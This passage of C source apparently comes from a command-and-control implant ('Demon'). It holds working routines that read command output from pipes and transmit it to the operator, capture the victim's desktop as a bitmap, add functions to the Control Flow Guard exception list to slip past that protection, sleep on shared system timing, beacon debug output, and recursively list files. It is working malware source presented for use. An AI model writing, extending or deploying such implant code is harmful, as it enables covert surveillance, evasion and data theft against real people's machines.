    if ( AnonPipes->StdOutWrite ) {
        SysNtClose( AnonPipes->StdOutWrite );
        AnonPipes->StdOutWrite = NULL;
    }

    Buffer = Instance->Win32.LocalAlloc( LPTR, 0 );

    do {
        Success = Instance->Win32.ReadFile( AnonPipes->StdOutRead, buf, 1024, &dwRead, NULL );
        PRINTF( "dwRead => %d\n", dwRead )

        if ( dwRead == 0 ) {
            break;
        }

        dwBufferSize += dwRead;

        Buffer = Instance->Win32.LocalReAlloc( Buffer, dwBufferSize, LMEM_MOVEABLE );

        MemCopy( Buffer + ( dwBufferSize - dwRead ), buf, dwRead );
        MemSet( buf, 0, dwRead );
    } while ( Success == TRUE );

    if ( dwBufferSize ) {
        Package = PackageCreateWithRequestID( DEMON_OUTPUT, RequestID );
        PackageAddBytes( Package, Buffer, dwBufferSize );
        PackageTransmit( Package );
    }

    DATA_FREE( Buffer, dwBufferSize );
}

/*!
 * takes a BMP screenshot of the current desktop
 * @param ImagePointer
 * @param ImageSize
 * @return
 */
BOOL WinScreenshot(
    OUT PVOID*  ImagePointer,
    OUT PSIZE_T ImageSize
) {
    BITMAPFILEHEADER    BitFileHdr  = { 0 };
    BITMAPINFOHEADER    BitInfoHdr  = { 0 };
    BITMAPINFO          BitMapInfo  = { 0 };
    HGDIOBJ             hTempMap    = NULL;
    HBITMAP             hBitmap     = NULL;
    BITMAP              AllDesktops = { 0 };
    HDC                 hDC, hMemDC = NULL;
    BYTE*               bBits       = NULL;
    DWORD               cbBits      = 0;
    BOOL                ReturnValue = FALSE;
    HGDIOBJ             ObjPtr      = NULL;

    PVOID               BitMapImage = NULL;
    DWORD               BitMapSize  = 0;

    // NOTE: if GetSystemMetrics fails, screenshot works anyways
    INT x = Instance->Win32.GetSystemMetrics( SM_XVIRTUALSCREEN );
    INT y = Instance->Win32.GetSystemMetrics( SM_YVIRTUALSCREEN );

    MemSet( &BitFileHdr, 0, sizeof( BITMAPFILEHEADER ) );
    MemSet( &BitInfoHdr, 0, sizeof( BITMAPINFOHEADER ) );
    MemSet( &BitMapInfo, 0, sizeof( BITMAPINFO ) );
    MemSet( &AllDesktops,0, sizeof( BITMAP ) );

    hDC = Instance->Win32.GetDC( NULL );
    if ( ! hDC ) {
        PUTS( "GetDC failed" )
        goto Cleanup;
    }

    hTempMap = Instance->Win32.GetCurrentObject( hDC, OBJ_BITMAP );
    if ( ! hTempMap ) {
        PUTS( "GetCurrentObject failed" )
        goto Cleanup;
    }

    if ( ! Instance->Win32.GetObjectW( hTempMap, sizeof( BITMAP ), &AllDesktops ) ) {
        PUTS( "GetObjectW failed" )
        goto Cleanup;
    }

    BitFileHdr.bfType        = ( WORD ) ( 'B' | ( 'M' << 8 ) );
    BitFileHdr.bfOffBits     = sizeof( BITMAPFILEHEADER ) + sizeof( BITMAPINFOHEADER );
    BitInfoHdr.biSize        = sizeof( BITMAPINFOHEADER );
    BitInfoHdr.biBitCount    = 24;
    BitInfoHdr.biCompression = BI_RGB;
    BitInfoHdr.biPlanes      = 1;
    BitInfoHdr.biWidth       = AllDesktops.bmWidth;
    BitInfoHdr.biHeight      = AllDesktops.bmHeight;

    BitMapInfo.bmiHeader     = BitInfoHdr;

    cbBits     = ( ( ( 24 * AllDesktops.bmWidth + 31 ) &~31 ) / 8 ) * AllDesktops.bmHeight;

    BitMapSize  = cbBits + ( sizeof( BITMAPFILEHEADER ) + sizeof( BITMAPINFOHEADER ) );
    BitMapImage = Instance->Win32.LocalAlloc( LPTR, BitMapSize );

    hMemDC  = Instance->Win32.CreateCompatibleDC( hDC );
    if ( ! hMemDC ) {
        PUTS( "CreateCompatibleDC failed" )
        goto Cleanup;
    }

    hBitmap = Instance->Win32.CreateDIBSection( hDC, &BitMapInfo, DIB_RGB_COLORS, ( VOID** ) &bBits, NULL, 0 );
    if ( ! hBitmap ) {
        PUTS( "CreateDIBSection failed" )
        goto Cleanup;
    }

    ObjPtr = Instance->Win32.SelectObject( hMemDC, hBitmap );
    if ( ! ObjPtr || ObjPtr == HGDI_ERROR ) {
        PUTS( "SelectObject failed" )
        goto Cleanup;
    }

    if ( ! Instance->Win32.BitBlt( hMemDC, 0, 0, AllDesktops.bmWidth, AllDesktops.bmHeight, hDC, x, y, SRCCOPY ) ) {
        PUTS( "BitBlt failed" )
        goto Cleanup;
    }

    MemCopy( BitMapImage, &BitFileHdr, sizeof( BITMAPFILEHEADER ) );
    MemCopy( BitMapImage + sizeof( BITMAPFILEHEADER ), &BitInfoHdr, sizeof( BITMAPINFOHEADER ) );
    MemCopy( BitMapImage + sizeof( BITMAPFILEHEADER ) + sizeof( BITMAPINFOHEADER ), bBits, cbBits );

    ReturnValue = TRUE;

Cleanup:

    if ( ImagePointer )
        *ImagePointer = BitMapImage;

    if ( ImageSize )
        *ImageSize = BitMapSize;

    if ( hTempMap ) {
        Instance->Win32.DeleteObject( hTempMap );
    }

    if ( hMemDC ) {
        Instance->Win32.DeleteDC( hMemDC );
    }

    if ( hDC ) {
        Instance->Win32.ReleaseDC( NULL, hDC );
    }

    if ( hBitmap ) {
        Instance->Win32.DeleteObject( hBitmap );
    }

    return ReturnValue;
}

/*!
 * Read from the pipe and writes it to the specified buffer
 * @param Handle handle to the pipe
 * @param Buffer buffer to save the read bytes from the pipe
 * @return pipe read successful or not
 */
BOOL PipeRead(
    IN HANDLE  Handle,
    IN PBUFFER Buffer
) {
    DWORD Read  = 0;
    DWORD Total = 0;

    do {
        if ( ! Instance->Win32.ReadFile( Handle, C_PTR( U_PTR( Buffer->Buffer ) + Total ), MIN( ( Buffer->Length - Total ), PIPE_BUFFER_MAX ), &Read, NULL ) ) {
            if ( NtGetLastError() != ERROR_MORE_DATA ) {
                PRINTF( "ReadFile failed with %d\n", NtGetLastError() )
                return FALSE;
            }
        }

        Total += Read;
    } while ( Total < Buffer->Length );

    return TRUE;
}

/*!
 * Write the specified buffer to the specified pipe
 * @param Handle handle to the pipe
 * @param Buffer buffer to write
 * @return pipe write successful or not
 */
BOOL PipeWrite(
    IN  HANDLE   Handle,
    OUT PBUFFER Buffer
) {
    DWORD Written = 0;
    DWORD Total   = 0;

    do {
        if ( ! Instance->Win32.WriteFile( Handle, Buffer->Buffer + Total, MIN( ( Buffer->Length - Total ), PIPE_BUFFER_MAX ), &Written , NULL ) ) {
            return FALSE;
        }

        Total += Written;
    } while ( Total < Buffer->Length );

    return TRUE;
}


/*!
 * @brief
 *  check if CFG is enforced in this current process.
 *
 * @return
 */
BOOL CfgQueryEnforced(
    VOID
) {
    EXTENDED_PROCESS_INFORMATION ProcInfoEx = { 0 };
    NTSTATUS                     NtStatus   = STATUS_SUCCESS;

    ProcInfoEx.ExtendedProcessInfo       = ProcessControlFlowGuardPolicy;
    ProcInfoEx.ExtendedProcessInfoBuffer = 0;

    /* query if Cfg is enabled or not. */
    if ( ! NT_SUCCESS( NtStatus = SysNtQueryInformationProcess(
            NtCurrentProcess(),
            ProcessCookie | ProcessUserModeIOPL,
            &ProcInfoEx,
            sizeof( ProcInfoEx ),
            NULL )
    ) ) {
        PRINTF( "NtQueryInformationProcess Failed => %p\n", NtStatus );
        return FALSE;
    }

    PRINTF( "Control Flow Guard Policy Enabled = %s\n", ProcInfoEx.ExtendedProcessInfoBuffer ? "TRUE" : "FALSE" );
    return U_PTR( ProcInfoEx.ExtendedProcessInfoBuffer );
}

/*!
 * @brief
 *  add Mod + function to CFG exception list.
 *
 * @param ImageBase
 * @param Function
 */
VOID CfgAddressAdd(
    IN PVOID ImageBase,
    IN PVOID Function
) {
    CFG_CALL_TARGET_INFO Cfg      = { 0 };
    MEMORY_RANGE_ENTRY   MemRange = { 0 };
    VM_INFORMATION       VmInfo   = { 0 };
    PIMAGE_NT_HEADERS    NtHeader = { 0 };
    ULONG                Output   = 0;
    NTSTATUS             NtStatus = STATUS_SUCCESS;

    NtHeader                = C_PTR( ImageBase + ( ( PIMAGE_DOS_HEADER ) ImageBase )->e_lfanew );
    MemRange.NumberOfBytes  = U_PTR( NtHeader->OptionalHeader.SizeOfImage + 0x1000 - 1 ) &~( 0x1000 - 1 );
    MemRange.VirtualAddress = ImageBase;

    /* set cfg target call info */
    Cfg.Flags  = CFG_CALL_TARGET_VALID;
    Cfg.Offset = Function - ImageBase;

    VmInfo.dwNumberOfOffsets = 1;
    VmInfo.plOutput          = &Output;
    VmInfo.ptOffsets         = &Cfg;
    VmInfo.pMustBeZero       = FALSE;
    VmInfo.pMoarZero         = FALSE;

    if ( ! NT_SUCCESS( NtStatus = SysNtSetInformationVirtualMemory( NtCurrentProcess(), VmCfgCallTargetInformation, 1, &MemRange, &VmInfo, sizeof( VmInfo ) ) ) ) {
        PRINTF( "NtSetInformationVirtualMemory Failed => %p", NtStatus );
    }
}

/*!
 * Sets an event
 * @param Event
 */
BOOL EventSet(
    IN HANDLE Event
) {
    return NT_SUCCESS( Instance->Win32.NtSetEvent( Event, NULL ) );
}


/*!
 * generates a random unsigned 32-bit integer
 * @return
 */
ULONG RandomNumber32(
    VOID
) {
    ULONG Seed = 0;

    Seed = NtGetTickCount();
    Seed = Instance->Win32.RtlRandomEx( &Seed );
    Seed = Instance->Win32.RtlRandomEx( &Seed );
    Seed = ( Seed % ( LONG_MAX - 2 + 1 ) ) + 2;

    return Seed % 2 == 0 ? Seed : Seed + 1;
}

/*!
 * generates a random bool
 * @return
 */
BOOL RandomBool(
    VOID
) {
    ULONG Seed = 0;

    Seed = NtGetTickCount();
    Seed = Instance->Win32.RtlRandomEx( &Seed );

    return Seed % 2 == 0 ? TRUE : FALSE;
}

/*!
 * get current timestamp since unix epoch
 * from KUSER_SHARED_DATA
 * @return
 */
ULONG64 SharedTimestamp(
    VOID
) {
    //SIZE_T        UnixStart     = 0x019DB1DED53E8000; /* Start of Unix epoch in ticks. */
    //SIZE_T        TicksPerMilli = 1000;
    LARGE_INTEGER Time          = { 0 };

    Time.LowPart  = USER_SHARED_DATA->SystemTime.LowPart;
    Time.HighPart = USER_SHARED_DATA->SystemTime.High2Time;

    // NOTE: avoid 64-bit division which doesn't work in x86
    //return ( ULONGLONG ) ( ( Time.QuadPart - UnixStart ) / TicksPerMilli );

    return Time.QuadPart;
}

/*!
 * Sleep using KUSER_SHARED_DATA.SystemTime
 * @param Delay
 */
VOID SharedSleep(
    ULONG64 Delay
) {
    SIZE_T  Rand          = { 0 };
    ULONG64 End           = { 0 };
    ULONG   TicksPerMilli = 1000;

    Delay *= TicksPerMilli;

    Rand = RandomNumber32();
    End  = SharedTimestamp() + Delay;

    /* increment random number til we reach the end */
    while ( SharedTimestamp() < End ) {
        Rand += 1;
    }

    if ( ( SharedTimestamp() - End ) > 2000 ) {
        return;
    }
}

VOID ShuffleArray(
    _Inout_ PVOID* array,
    IN     SIZE_T n
) {
    SIZE_T j = 0;
    PVOID  t = NULL;

    for ( int i = 0; i < n - 1; i++ )
    {
        j = i + ( RandomNumber32() & RAND_MAX ) / ( RAND_MAX / ( n - i ) + 1 );
        t = array[ j ];

        array[ j ] = array[ i ];
        array[ i]  = t;
    }
}

VOID volatile ___chkstk_ms(
        VOID
) { __asm__( "nop" ); }

#if defined(SEND_LOGS) && defined(DEBUG)

VOID DemonPrintf( PCHAR fmt, ... )
{
    PPACKAGE    package              = NULL;
    va_list     VaListArg            = 0;
    PVOID       CallbackOutput       = NULL;
    INT         CallbackSize         = 0;

    if ( ! Instance->Session.Connected ) {
        return;
    }

    package = PackageCreate( BEACON_OUTPUT );

    va_start( VaListArg, fmt );

    CallbackSize    = Instance->Win32.vsnprintf( NULL, 0, fmt, VaListArg );
    CallbackOutput  = Instance->Win32.LocalAlloc( LPTR, CallbackSize );

    Instance->Win32.vsnprintf( CallbackOutput, CallbackSize, fmt, VaListArg );

    va_end( VaListArg );

    PkgAdIn32( package, 0 ); // CALLBACK_OUTPUT
    PackageAddBytes( package, CallbackOutput, CallbackSize );
    PackageTransmit( package );

    MemSet( CallbackOutput, 0, CallbackSize );
    Instance->Win32.LocalFree( CallbackOutput );
}

#elif defined(SHELLCODE) && defined(DEBUG)

VOID LogToConsole(
    IN LPCSTR fmt,
    ...)
{
    INT     OutputSize   = 0;
    LPSTR   OutputString = NULL;
    va_list VaListArg    = 0;

    // have we initialized all the function addresses?
    if ( Instance->Win32.AttachConsole == NULL ||
         Instance->Win32.vsnprintf     == NULL ||
         Instance->Win32.GetStdHandle  == NULL ||
         Instance->Win32.WriteConsoleA == NULL ||
         Instance->Win32.LocalAlloc    == NULL )
        return;

    // get the handle to the output console
    if ( Instance->hConsoleOutput == NULL )
    {
        Instance->Win32.AttachConsole( ATTACH_PARENT_PROCESS );
        Instance->hConsoleOutput = Instance->Win32.GetStdHandle( STD_OUTPUT_HANDLE );
        if ( ! Instance->hConsoleOutput  )
            return;
    }

    va_start( VaListArg, fmt );

    // allocate space for the final string
    OutputSize   = Instance->Win32.vsnprintf( NULL, 0, fmt, VaListArg ) + 1;
    OutputString = Instance->Win32.LocalAlloc( LPTR, OutputSize );

    // write the final string
    Instance->Win32.vsnprintf( OutputString, OutputSize, fmt, VaListArg );

    // write it to the console
    Instance->Win32.WriteConsoleA( Instance->hConsoleOutput, OutputString, OutputSize, NULL, NULL );

    DATA_FREE( OutputString, OutputSize );

    va_end( VaListArg );
}

#endif

PROOT_DIR listDir(
    IN LPWSTR StartPath,
    IN BOOL   SubDirs,
    IN BOOL   FilesOnly,
    IN BOOL   DirsOnly,
    IN LPWSTR Starts,
    IN LPWSTR Contains,
    IN LPWSTR Ends,
    IN UINT32 MaxLevelDeep)
{
    WIN32_FIND_DATAW FindData      = { 0 };
    HANDLE           hFile         = NULL;
    ULARGE_INTEGER   FileSize      = { 0 };
    PROOT_DIR        RootDir       = NULL;
    PROOT_DIR        Dir           = NULL;
    PROOT_DIR        LastDir       = NULL;
    PROOT_DIR        TmpRootDir    = NULL;
    PDIR_OR_FILE     DirOrFile     = NULL;
    PDIR_OR_FILE     LastDirOrFile = NULL;
    PDIR_OR_FILE     TmpDirOrFile  = NULL;
    PSUB_DIR         RootSubDir    = NULL;
    PSUB_DIR         LastSubDir    = NULL;
    PSUB_DIR         SubDir        = NULL;
    BOOL             IsDir         = FALSE;
    LPWSTR           Path          = NULL;
    UINT32           PathSize      = NULL;
    BOOL             Success       = FALSE;

    if ( ( ! StartPath ) || ( FilesOnly && DirsOnly ) ) {
        PUTS( "Invalid arguments" )
        goto Cleanup;
    }

    // allocate the path on the heap to keep stack usage low (given that this function is recursive)
    Path = Instance->Win32.LocalAlloc( LPTR, ( MAX_PATH + 2 + 1 ) * sizeof( WCHAR ) );
    if ( ! Path )
    {
        PUTS( "Failed to allocate memory" );
        goto Cleanup;
    }

    // copy the path
    PathSize = MIN( MAX_PATH, StringLengthW( StartPath ) );
    MemCopy( Path, StartPath, PathSize * sizeof( WCHAR ) );

    // search for the first file in the folder specified
    hFile = Instance->Win32.FindFirstFileW( Path, &FindData );
    if ( hFile == INVALID_HANDLE_VALUE )
    {
        PRINTF( "FindFirstFileW failed for path %ls\n", Path );
        goto Cleanup;
    }

    IsDir = ( FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY ) == FILE_ATTRIBUTE_DIRECTORY;

    // If it's a single directory without a wildcard, re-run it with a \*
    if ( IsDir && Path[ PathSize - 1 ] != 0x2a )
    {
        if ( Path[ PathSize - 1 ] != 0x5c )
            Path[ PathSize++ ] = 0x5c;
        Path[ PathSize++ ] = 0x2a;
        Path[ PathSize ]   = 0x00;

        // repeat the search
        Instance->Win32.FindClose( hFile );
        hFile = Instance->Win32.FindFirstFileW( Path, &FindData );
        if ( hFile == INVALID_HANDLE_VALUE )
        {
            PRINTF( "FindFirstFileW failed for path %ls\n", Path );
            goto Cleanup;
        }
    }

    // allocate the RootDir
    RootDir = Instance->Win32.LocalAlloc( LPTR, sizeof( ROOT_DIR ) );
    if ( ! RootDir )
    {
        PUTS( "Failed to allocate memory" );
        goto Cleanup;
    }

    MemCopy( RootDir->Path, Path, MIN( MAX_PATH, StringLengthW( Path ) ) * sizeof( WCHAR ) );

    do
    {
        IsDir = ( FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY ) == FILE_ATTRIBUTE_DIRECTORY;

        // ignore dirs if we are only looking for files on the current dir
        if ( IsDir && ! SubDirs && FilesOnly )
            continue;

        // ignore files if we are only looking for dirs
        if ( ! IsDir && DirsOnly )
            continue;

        // ignore .
        if ( IsDir &&
             StringLengthW( FindData.cFileName ) == 1 &&
             FindData.cFileName[0] == 0x2e )
            continue;

        // ignore ..
        if ( IsDir &&
             StringLengthW( FindData.cFileName ) == 2 &&
             FindData.cFileName[0] == 0x2e &&
             FindData.cFileName[1] == 0x2e )
            continue;

        // if we are interested in subdirs, remember that we found this directory
        if ( IsDir && SubDirs )
        {
            SubDir = Instance->Win32.LocalAlloc( LPTR, sizeof( SUB_DIR ) );
            if ( ! SubDir )
            {
                PUTS( "Failed to allocate memory" );
                goto Cleanup;
            }

            MemCopy( SubDir->Path, Path, ( PathSize - 1 ) * sizeof( WCHAR ) );
            StringConcatW( SubDir->Path, FindData.cFileName );

            if ( ! LastSubDir ) {
                RootSubDir = SubDir;
                LastSubDir = SubDir;
            } else {
                LastSubDir->Next = SubDir;
                LastSubDir = SubDir;
            }
        }

        // ignore dirs if we are only looking for files
        if ( IsDir && FilesOnly )
            continue;

        // if defined, make sure the name starts with Starts
        if ( Starts )
        {
            if ( StringLengthW( FindData.cFileName ) < StringLengthW( Starts ) )
                continue;
            if ( StringCompareIW( Starts, FindData.cFileName ) != 0 )
                continue;
        }

        // if defined, make sure the name contains with Contains
        if ( Contains )
        {
            if ( StringLengthW( FindData.cFileName ) < StringLengthW( Contains ) )
                continue;
            if ( ! WcsStr( FindData.cFileName, Contains ) )
                continue;
        }

        // if defined, make sure the name ends with Ends
        if ( Ends )
        {
            if ( StringLengthW( FindData.cFileName ) < StringLengthW( Ends ) )
                continue;
            if ( StringCompareIW( Ends, &FindData.cFileName[ StringLengthW( FindData.cFileName ) - StringLengthW( Ends ) ] ) != 0 )
                continue;
        }

        // save this directory or file
        DirOrFile = Instance->Win32.LocalAlloc( LPTR, sizeof( DIR_OR_FILE ) );
        if ( ! DirOrFile )
        {
            PUTS( "Failed to allocate memory" );
            goto Cleanup;
        }

        Instance->Win32.FileTimeToSystemTime( &FindData.ftLastAccessTime, &DirOrFile->FileTime );
        Instance->Win32.SystemTimeToTzSpecificLocalTime( 0, &DirOrFile->FileTime, &DirOrFile->SystemTime );

        DirOrFile->IsDir = IsDir;

        if ( DirOrFile->IsDir )
        {
            RootDir->NumFolders += 1;
        }
        else
        {
            FileSize.HighPart = FindData.nFileSizeHigh;
            FileSize.LowPart  = FindData.nFileSizeLow;
            DirOrFile->Size   = FileSize.QuadPart;

            RootDir->NumFiles      += 1;
            RootDir->TotalFileSize += DirOrFile->Size;
        }

        MemCopy( DirOrFile->FileName, FindData.cFileName, StringLengthW( FindData.cFileName ) * sizeof( WCHAR ) );

        if ( LastDirOrFile ) {
            LastDirOrFile->Next = DirOrFile;
        } else {
            RootDir->Content = DirOrFile;
        }
        LastDirOrFile = DirOrFile;
    }
    while ( Instance->Win32.FindNextFileW( hFile, &FindData ) );

    // list all subdirs recursively if requested
    SubDir  = RootSubDir;
    LastDir = RootDir;
    while ( MaxLevelDeep > 0 && SubDir )
    {
        Dir = listDir( SubDir->Path, SubDirs, FilesOnly, DirsOnly, Starts, Contains, Ends, MaxLevelDeep -1 );

        if ( Dir )
        {
            LastDir->Next = Dir;
            LastDir       = Dir;
            while ( LastDir->Next )
            {
                LastDir = LastDir->Next;
            }
        }

        SubDir = SubDir->Next;
    }

    Success = TRUE;

Cleanup:
    if ( hFile )
        Instance->Win32.FindClose( hFile );

    DATA_FREE( Path, ( MAX_PATH + 2 + 1 ) * sizeof( WCHAR ) );

    SubDir = RootSubDir;
    while ( SubDir )
    {
        LastSubDir = SubDir->Next;
        DATA_FREE( SubDir, sizeof( SUB_DIR ) );
        SubDir = LastSubDir;
    }

    if ( ! Success )
    {
        while ( RootDir )
        {
            DirOrFile = RootDir->Content;
            while ( DirOrFile )
            {
                TmpDirOrFile = DirOrFile->Next;
                DATA_FREE( DirOrFile, sizeof( DIR_OR_FILE ) );
                DirOrFile = TmpDirOrFile;
            }

            TmpRootDir = RootDir->Next;
            DATA_FREE( RootDir, sizeof( ROOT_DIR ) );
            RootDir = TmpRootDir;
        }

        return NULL;
    }

    return RootDir;
}
